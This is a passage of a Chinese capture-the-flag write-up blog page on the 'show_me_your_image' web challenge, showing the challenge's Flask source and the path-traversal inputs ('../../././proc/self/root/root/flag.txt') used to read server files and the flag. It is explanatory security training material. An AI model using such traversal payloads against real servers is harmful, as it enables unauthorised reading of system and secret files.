ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">@app.route(<span class="string">'/index.php'</span>)</span><br><span class="line">def home():</span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    return render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload.php'</span>, methods=[<span class="string">'POST'</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file and allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> not os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        else:</span><br><span class="line">            return <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    return redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/img.php'</span>, methods=[<span class="string">'GET'</span>])</span><br><span class="line">def img():</span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    return Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">../../././proc/self/cwd/templates/upload.html  </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                上传图片</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> file %&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img.php?name=</span></span></span><span class="template-variable">&#123;&#123; file &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span></span><br><span class="line"><span class="xml">    请上传一张图片</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- flag in /root/flag.txt ! Get it ! --&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>所以flag在/root/flag.txt下了最后利用</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/../</span>.<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>root<span class="regexp">/flag.txt     #读flag</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-f4164106f9873a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h3 id="0x04-按F注入"><a href="#0x04-按F注入" class="headerlink" title="0x04 按F注入"></a>0x04 按F注入</h3><p>fbctf2019题目的修改题，目前只做到了回显数据库信息，还没读到flag，等复现完再写<br>参考：<a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+              <a href="/tags/XXE/" rel="tag"><i class="fa fa-tag"></i> XXE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/08/05/2019-De1CTF-Web-wp/" rel="prev" title="2019 De1CTF Web_wp">
+      <i class="fa fa-chevron-left"></i> 2019 De1CTF Web_wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/08/19/2019-SUCTF-Web-writeup/" rel="next" title="2019 SUCTF Web writeup">
+      2019 SUCTF Web writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Game"><span class="nav-number">1.</span> <span class="nav-text">0x01 Game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-who-are-you"><span class="nav-number">2.</span> <span class="nav-text">0x02 who_are_you</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-show-me-your-image"><span class="nav-number">3.</span> <span class="nav-text">0x03 show_me_your_image</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-按F注入"><span class="nav-number">4.</span> <span class="nav-text">0x04 按F注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cyc1e"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Cyc1e</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Cyc1eC" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Cyc1eC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/9c3ca1ca4784" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;9c3ca1ca4784" rel="noopener" target="_blank"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cyc1e</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">176k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
